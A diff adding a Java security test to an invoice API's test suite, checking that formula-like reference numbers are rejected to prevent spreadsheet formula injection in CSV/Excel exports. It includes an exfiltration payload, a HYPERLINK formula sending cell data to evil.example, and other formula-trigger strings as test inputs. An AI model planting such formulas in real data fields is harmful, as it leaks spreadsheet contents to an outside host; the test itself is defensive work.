@@ -494,6 +494,60 @@ public class SecurityCriticalTests {
                 .andExpect(status().isConflict());
     }
 
+    // --- F-17: reference numbers end up in CSV/Excel exports opened by managers,
+    // so a value a spreadsheet would run as a formula must be refused at input. ---
+    @Test
+    void formulaLikeReferenceNumbers_areRejected() throws Exception {
+        Role managerRole = roleRepository.findByNameIgnoreCase("PROCUREMENT_MANAGER").orElseThrow();
+        User procurementUser = createUser(
+                "f17-" + System.nanoTime() + "@test.local", Set.of(managerRole), true, null);
+        String token = tokenFor(procurementUser);
+        Project project = createProject("F17-" + System.nanoTime());
+        Supplier supplier = createSupplier("BP-F17-" + System.nanoTime());
+
+        java.util.function.BiFunction<String, String, String> body = (field, value) -> {
+            java.util.Map<String, Object> m = new java.util.HashMap<>(java.util.Map.of(
+                    "invoiceType", "CREDIT", "invoiceSource", "PROJECT",
+                    "projectId", project.getId(), "supplierId", supplier.getId(),
+                    "invoiceNumber", "INV-F17-" + System.nanoTime(),
+                    "invoiceDate", LocalDate.now().toString(), "receivedDate", LocalDate.now().toString(),
+                    "purchaseOrderNumber", "PO/2026/001", "value", 100));
+            m.put(field, value);
+            try {
+                return objectMapper.writeValueAsString(m);
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
+        };
+
+        String payload = "=HYPERLINK(\"https://evil.example/?d=\"&A2,\"x\")";
+        for (String field : new String[] {"invoiceNumber", "purchaseOrderNumber", "pioNumber", "grnNumber"}) {
+            for (String bad : new String[] {payload, "+1+1", "-1+1", "@SUM(1)", "\t=1+1", "A1\r=1+1"}) {
+                mockMvc.perform(post("/api/invoices")
+                                .header("Authorization", "Bearer " + token)
+                                .contentType("application/json")
+                                .content(body.apply(field, bad)))
+                        .andExpect(status().isUnprocessableEntity())
+                        .andExpect(jsonPath("$.fieldErrors." + field).exists());
+            }
+        }
+
+        Invoice existing = createInvoice(project, supplier, procurementUser, null);
+        mockMvc.perform(post("/api/invoices/" + existing.getId() + "/grn")
+                        .header("Authorization", "Bearer " + token)
+                        .contentType("application/json")
+                        .content(objectMapper.writeValueAsString(java.util.Map.of("grnNumber", payload))))
+                .andExpect(status().isUnprocessableEntity())
+                .andExpect(jsonPath("$.fieldErrors.grnNumber").exists());
+
+        // Ordinary reference formats (slashes, dashes after the first char, spaces) still pass.
+        mockMvc.perform(post("/api/invoices")
+                        .header("Authorization", "Bearer " + token)
+                        .contentType("application/json")
+                        .content(body.apply("pioNumber", "PIO-26/0042 A")))
+                .andExpect(status().isOk());
+    }
+
     // --- Rule 9 (F-04): A token must stop working the moment the user is
     // deactivated, demoted, changes their password or logs out — not when
     // it happens to expire up to 10 hours later. ---
